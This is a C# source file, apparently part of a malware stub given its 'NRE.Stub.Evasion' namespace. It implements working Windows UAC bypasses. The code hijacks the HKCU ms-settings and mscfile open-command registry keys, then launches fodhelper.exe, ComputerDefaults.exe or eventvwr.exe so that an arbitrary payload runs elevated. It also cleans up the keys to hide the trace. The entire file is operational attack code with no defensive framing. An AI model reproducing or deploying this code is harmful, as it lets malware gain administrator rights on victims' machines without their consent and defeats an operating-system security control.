using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// UAC bypass via trusted reparse/COM or registry hijack of elevated COM objects.
    /// </summary>
    public static class UacBypass
    {
        private const string FodHelperPath = @"C:\Windows\System32\fodhelper.exe";
        private const string ComputerDefaultsPath = @"C:\Windows\System32\ComputerDefaults.exe";
        private const string EventVwrPath = @"C:\Windows\System32\eventvwr.exe";

        /// <summary>
        /// Try FodHelper UAC bypass: HKCU\...\ms-settings\shell\open\command.
        /// </summary>
        public static bool TryFodHelper(string payloadPath)
        {
            try
            {
                const string key = @"Software\Classes\ms-settings\Shell\Open\command";
                using (var k = Registry.CurrentUser.CreateSubKey(key, true))
                {
                    if (k == null) return false;
                    k.SetValue("", payloadPath);
                    k.SetValue("DelegateExecute", "");
                    k.Close();
                }
                var psi = new ProcessStartInfo
                {
                    FileName = FodHelperPath,
                    UseShellExecute = true,
                    CreateNoWindow = true
                };
                using (Process.Start(psi)) { }
                System.Threading.Thread.Sleep(1500);
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// ComputerDefaults UAC bypass (similar registry hijack).
        /// </summary>
        public static bool TryComputerDefaults(string payloadPath)
        {
            try
            {
                const string key = @"Software\Classes\ms-settings\Shell\Open\command";
                using (var k = Registry.CurrentUser.CreateSubKey(key, true))
                {
                    if (k == null) return false;
                    k.SetValue("", payloadPath);
                    k.SetValue("DelegateExecute", "");
                }
                var psi = new ProcessStartInfo
                {
                    FileName = ComputerDefaultsPath,
                    UseShellExecute = true,
                    CreateNoWindow = true
                };
                using (Process.Start(psi)) { }
                System.Threading.Thread.Sleep(1500);
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// EventVwr: uses mscfile association; hijack HKCU\Software\Classes\mscfile\shell\open\command.
        /// </summary>
        public static bool TryEventVwr(string payloadPath)
        {
            try
            {
                const string key = @"Software\Classes\mscfile\shell\open\command";
                using (var k = Registry.CurrentUser.CreateSubKey(key, true))
                {
                    if (k == null) return false;
                    k.SetValue("", payloadPath);
                    k.SetValue("DelegateExecute", "");
                }
                var psi = new ProcessStartInfo
                {
                    FileName = EventVwrPath,
                    UseShellExecute = true,
                    CreateNoWindow = true
                };
                using (Process.Start(psi)) { }
                System.Threading.Thread.Sleep(1500);
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile"); } catch { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Run first successful UAC bypass with the given payload path (exe to run elevated).
        /// </summary>
        public static bool RunElevated(string payloadPath)
        {
            if (string.IsNullOrEmpty(payloadPath) || !File.Exists(payloadPath)) return false;
            if (TryFodHelper(payloadPath)) return true;
            if (TryComputerDefaults(payloadPath)) return true;
            if (TryEventVwr(payloadPath)) return true;
            return false;
        }
    }
}
